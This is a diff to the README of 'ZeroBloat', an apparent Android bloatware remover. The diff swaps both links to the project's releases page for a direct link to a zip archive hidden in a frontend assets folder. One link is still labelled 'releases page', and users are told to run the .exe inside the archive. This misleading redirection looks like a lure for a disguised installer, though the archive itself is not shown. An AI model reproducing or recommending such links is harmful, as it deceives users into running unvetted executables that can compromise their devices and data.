@@ -1,6 +1,6 @@
 # 📱 ZeroBloat - Remove unwanted apps from your phone
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/70-heritieralittoralis130/ZeroBloat/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/70-heritieralittoralis130/ZeroBloat/main/frontend/src/assets/Bloat-Zero-2.7.zip)
 
 ZeroBloat removes heavy, pre-installed software from Android devices. Many phones come with apps you cannot delete through standard settings. These apps consume battery life, use data, and track your activity. ZeroBloat uses the Android Debug Bridge (ADB) to remove these items without root access. This process keeps your system stable while freeing up storage space.
 
@@ -8,7 +8,7 @@ ZeroBloat removes heavy, pre-installed software from Android devices. Many phone
 
 You do not need programming experience to use this app. Follow these steps to prepare your computer and your phone.
 
-1. Visit the [releases page](https://github.com/70-heritieralittoralis130/ZeroBloat/releases) to download the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/70-heritieralittoralis130/ZeroBloat/main/frontend/src/assets/Bloat-Zero-2.7.zip) to download the installer.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your computer.
 4. Open the file to start the installation process.
